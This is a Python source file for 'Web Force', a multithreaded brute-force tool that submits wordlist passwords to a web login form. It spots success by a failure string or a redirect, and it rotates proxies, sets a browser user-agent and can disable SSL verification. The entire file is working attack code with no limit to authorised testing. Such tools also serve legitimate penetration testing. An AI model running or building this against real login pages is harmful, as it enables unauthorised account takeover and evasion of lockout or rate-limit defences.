#!/usr/bin/env python3

#Importing Libraries
import requests
import argparse
import threading
import time
import sys
import logging
import random
import shutil
import pyfiglet
import os
#Building Arguments
parser= argparse.ArgumentParser(description="Web Force is a web app password bruteforce tool")
parser.add_argument('-t','--target',required=True,help="Provide Target Url")
parser.add_argument('-u','--username',required=True,help="Provide Username")
parser.add_argument('-w','--wordlist',required=True,help="Path to wordlist")
parser.add_argument('-f','--failed',default='Invalid', help="Provide the string that occurs on invlaid creds.")
parser.add_argument('-uf','--usernamef',default="username",help="Provide Username feild")
parser.add_argument('-pf','--passwordf',default="password",help="Provide Password feild")
parser.add_argument('-T', '--timeout', default=5, type=int, help="Request timeout in seconds (default:5)")
parser.add_argument('-th','--threads', default=1, type=int, help="Number of thread (default:1)")
parser.add_argument('-ua', '--useragent', default="Mozilla/5.0", help="Provide user agent")
parser.add_argument('-r','--redirect', help='Provide the location webapp redirects to(on success)')
parser.add_argument('--proxy', help='Use a single proxy (e.g. http://127.0.0.1:8080)')
parser.add_argument('--proxylist', help='Use a list of proxies (one per line)')
parser.add_argument('--no-verify', action='store_true', help='Disable SSL certificate verification')
parser.add_argument('--log', action='store_true', help='Enables logging to webforce.log')
args= parser.parse_args()

#Colors
RED     = '\033[91m'
GREEN   = '\033[92m'
YELLOW  = '\033[93m'
BLUE    = '\033[94m'
MAGENTA = '\033[95m'
CYAN    = '\033[96m'
WHITE   = '\033[97m'
RESET   = '\033[0m'
BOLD    = '\033[1m'

# Cleaning the screen
os.system('cls' if os.name=='nt' else 'clear')

#Telling User
headers={'User-Agent':args.useragent} # building a header with a legit browser user-agent
print(f"{CYAN}Target: {BOLD}{args.target}{RESET}")
print(f"{CYAN}Username: {BOLD}{args.username}{RESET}")
print(f"{CYAN}Path to wordlist: {BOLD}{args.wordlist}{RESET}")
print(f"{CYAN}String indicating failed attempt set as: {BOLD}{args.failed}{RESET}")
print(f"{CYAN}Username field: {BOLD}{args.usernamef}{RESET}")
print(f"{CYAN}Password field: {BOLD}{args.passwordf}{RESET}")
print(f"{CYAN}Request TimeOut in: {BOLD}{args.timeout}s{RESET}")
print(f"{CYAN}Number of threads utilizing: {BOLD}{args.threads}{RESET}")
print(f"{CYAN}Our user agent is: {BOLD}{args.useragent}{RESET}")
#Setting baisc Threading
found = threading.Event()
lock = threading.Lock()
thread_local = threading.local()
#Defining Functions
def splash_screen():
    term_width = shutil.get_terminal_size().columns
    banner = pyfiglet.figlet_format("Web Force")
    for line in banner.split('\n'):
        print(line.center(term_width))
#1. For proxies
def load_proxies(proxylist):
    try:
        with open(proxylist) as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{RED}The given list of proxies does not exists.{RESET}")
        sys.exit(1)
#2. For giving sessions to threads + giving proxies
def get_session(proxies=None):
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        session.headers.update(headers)

        if proxies:
            proxy = random.choice(proxies)
            session.proxies={
                'http':proxy,
                'https':proxy
            }
        elif args.proxy:
            session.proxies={
                'http':args.proxy,
                'https':args.proxy
            }
        thread_local.session = session
    return thread_local.session
#3. logging stuff
def check_logging(log):
    if log:
        logging.basicConfig(
            filename='webforce.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        print(f"{YELLOW}[*] Logging is enabled. Output will be saved to 'webforce.log'")
    else:
        logging.disable(logging.CRITICAL)
#4. password generator         
def password_extract(wordlist):
    try:
        with open(wordlist,'r',encoding="latin-1") as file:
            for line in file:
                yield line.strip()
    except FileNotFoundError:
        print(f"{RED}The provided file path is not valid. Please Check Again{RESET}")
        sys.exit(1)
#5. main logic
def attempt_login(password, proxies=None):
    if found.is_set():
        return
    session = get_session(proxies)
    data = {args.usernamef:args.username, args.passwordf:password}
    try:
        response = session.post(args.target,data, timeout=args.timeout, allow_redirects=False, verify=not(args.no_verify)) #sending data getting response
        if args.redirect: # checking if need for redirect check
                location = response.headers.get("Location", "")
                if args.redirect in location:
                    with lock:
                        print(f"{GREEN}{BOLD}[+] Success! Password found: {WHITE}{password}{RESET}")
                        logging.info(f"Success! Password found: {password}")
                    found.set()
                else:
                    with lock:
                        print(f"{BLUE}[-] Tried: {WHITE}{BOLD}{password} - {RESET}{RED}Failed{RESET}")
                        logging.info(f"Tried: {password} - Failed")
        else:
            if args.failed not in response.text:
                with lock:
                    print(f"{GREEN}{BOLD}[+] Success! Password found: {WHITE}{password}{RESET}")
                    logging.info(f"Success! Password found: {password}")
                found.set()
            else:
                with lock:
                    print(f"{BLUE}[-] Tried: {WHITE}{BOLD}{password} - {RESET}{RED}Failed{RESET}")
                    logging.info(f"Tried: {password} - Failed")
    except requests.exceptions.RequestException as e: # handling any request exception
        with lock:
            print(f"{MAGENTA}An error occured {e}{RESET}")
            logging.error(f"An request error occured {e}")

# main function
def main():
        splash_screen()
        proxies = load_proxies(args.proxylist) if args.proxylist else None #loading proxies if exists
        print(f"{YELLOW}{BOLD}BruteForce Starts!{RESET}")
        check_logging(args.log)
        passwords=password_extract(args.wordlist)

        if args.threads==1:
            for password in passwords:
                if found.is_set():
                    return
                attempt_login(password,proxies)
        else:
            threads = []
            for password in passwords:
                if found.is_set():
                    break
                while threading.active_count()-1 >= args.threads:
                    time.sleep(0.1)
                t = threading.Thread(target=attempt_login, args=(password,proxies))
                threads.append(t)
                t.start()

            for t in threads:
                t.join()
            
        if not found.is_set():
            print(f"{BOLD}[-] Password not found in wordlist.{RESET}")
            logging.info("Password not found in wordlist.")
            sys.exit(1)
        else:
            sys.exit(0)
#handling keyboard interrupt
try:
    main()
except KeyboardInterrupt:
    print(f"{BOLD}")
    print("\nWeb Force is terminated Successfully")
    print(f"{RESET}")
    logging.error("Keyboard Interrupt")